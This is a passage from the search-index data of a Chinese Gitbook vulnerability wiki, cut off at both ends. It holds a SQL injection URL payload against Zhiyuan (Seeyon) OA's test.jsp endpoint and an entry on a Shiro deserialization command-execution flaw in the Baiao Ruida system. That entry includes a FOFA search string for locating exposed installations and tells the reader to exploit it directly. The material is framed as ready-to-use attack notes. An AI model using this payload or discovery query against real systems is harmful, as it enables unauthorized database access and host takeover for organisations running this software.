/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1)) 利用方法与致远OA 的SQL注入类似 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:29 "},"Web安全/百傲瑞达系统/百傲瑞达系统shiro反序列化漏洞/百傲瑞达系统shiro反序列化漏洞.html":{"url":"Web安全/百傲瑞达系统/百傲瑞达系统shiro反序列化漏洞/百傲瑞达系统shiro反序列化漏洞.html","title":"百傲瑞达系统shiro反序列化漏洞","keywords":"","body":"百傲瑞达系统存在shiro反序列化 漏洞描述 百傲瑞达系统由于采用了不安全的框架系统，存在命令执行漏洞，攻击者可利用此漏洞获取主机权限。 漏洞影响 百傲瑞达系统 FOFA body=\"百傲瑞达\" 漏洞复现 1）登录界面 该系统存在shiro发序列化，直接利用即可 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:30 "}}